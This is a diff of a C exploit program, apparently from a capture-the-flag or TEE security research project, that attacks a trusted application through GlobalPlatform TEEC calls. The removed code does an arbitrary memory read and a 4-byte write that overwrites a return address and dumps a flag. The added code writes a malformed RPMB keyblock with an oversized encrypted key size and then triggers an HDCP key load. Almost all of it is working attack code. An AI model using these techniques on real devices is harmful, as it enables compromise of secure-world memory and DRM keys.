@@ -18,62 +18,44 @@ void (*TEEC_CloseSession_impl)(TEEC_Session*);
 TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
 TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
 
-uint32_t leak_mem(uint32_t address, TEEC_Context *context, TEEC_Session *session)
+uint32_t load_hdcpkey(TEEC_Context *context, TEEC_Session *session)
 {
-    void* mem_area1 = malloc(0x370);
-    memset(mem_area1, 0, 0x370);
 
     TEEC_Operation op;
     memset(&op, 0, sizeof(op));
-    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
+    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INPUT, TEEC_NONE,
                                      TEEC_NONE, TEEC_NONE);
-    op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
-    op.params[0].tmpref.size =  0x370;
-    // Data gets writen to arbitrary location
-    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
-                                     TEEC_NONE, TEEC_NONE);
-    op.params[1].value.a = address;
-    op.params[1].value.b = address;
+    op.params[0].value.a = 1234;  // the keyblock buffer
+    op.params[0].value.b =  1234;
     uint32_t err_origin;
 
-    TEEC_Result res = TEEC_InvokeCommand_impl(session, 1, &op, &err_origin);
-    if (res != 0) {
-        printf("\t read address at 0x%x, value: 0x%x\n", address, *(int*)mem_area1);
-        printf("\t ret: %x :/\n", res);
-    }
-    return *(uint32_t*)mem_area1;
+    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0xc, &op, &err_origin);
+    return 0;
 }
 
-void arb_write_4_bytes(uint32_t address, uint32_t value, TEEC_Context *context, TEEC_Session *session)
+void rpmbWrite(TEEC_Context *context, TEEC_Session *session)
 {
-    void* mem_area1 = malloc(0x370);
-    memset(mem_area1, 0, 0x370);
+    void* mem_area1 = malloc(0x1000);
+    memset(mem_area1, 0, 0x1000);
     int* int_mem_area = (int*)mem_area1;
     *(uint8_t *)(mem_area1) = 0x4B;
     *(uint8_t *)(mem_area1 + 1) = 0x42;
     *(uint8_t *)(mem_area1 + 2) = 0x50;
     *(uint8_t *)(mem_area1 + 3) = 0x4D;
-    int_mem_area[17] = 1;
-    int_mem_area[18] = value;
+    int_mem_area[17] = 3; //keycount
+    int_mem_area[18] = 0x1337; // drmKeyId
+    int_mem_area[22] = 0xffff0000; //encDrmKeySize
     
     TEEC_Operation op;
     memset(&op, 0, sizeof(op));
-    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
+    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_NONE,
                                      TEEC_NONE, TEEC_NONE);
     op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
     op.params[0].tmpref.size =  0x370; 
-    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
-                                     TEEC_NONE, TEEC_NONE); 
-    op.params[1].value.a = address;
-    op.params[1].value.b = 4;
     uint32_t err_origin;
 
     //TEEC_Result res = TEEC_InvokeCommand_impl(session, 1, &op, &err_origin);
-    TEEC_Result res = TEEC_InvokeCommand_impl(session, 1, &op, &err_origin);
-    if (res != 0) {
-        printf("\t overwrite return address at 0x%x, value: 0x%x\n", address, value);
-        printf("\t ret: %x :/\n", res);
-    }
+    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0xd, &op, &err_origin);
 }
 
 
@@ -118,15 +100,11 @@ int main(int argc, char **argv)
     }
 
     // write banner
-    printf("[+] hijacking CheckMemory...\n");
-    //arb_write_4_bytes(0x8000, 0x402b04, &context, &session);
-    arb_write_4_bytes(0x1d190, 0x402b04, &context, &session);
-    int* leak_buf = (int*)malloc(0x400);
-    int do_read=0x61a000;
-    for(int i=0;i<0x10;i++){
-	leak_buf[i] = leak_mem(do_read+i*4, &context, &session);
-    }
-    printf("flag: %s\n", (char*)leak_buf);
+    printf("[+] writing to RPBM memory...\n");
+    rpmbWrite(&context, &session);
+    printf("[+] triggering hdcp key load...\n");
+    load_hdcpkey(&context, &session);
+    printf("[+] done...\n");
     TEEC_CloseSession_impl(&session);
     TEEC_FinalizeContext_impl(&context);
     return 0;
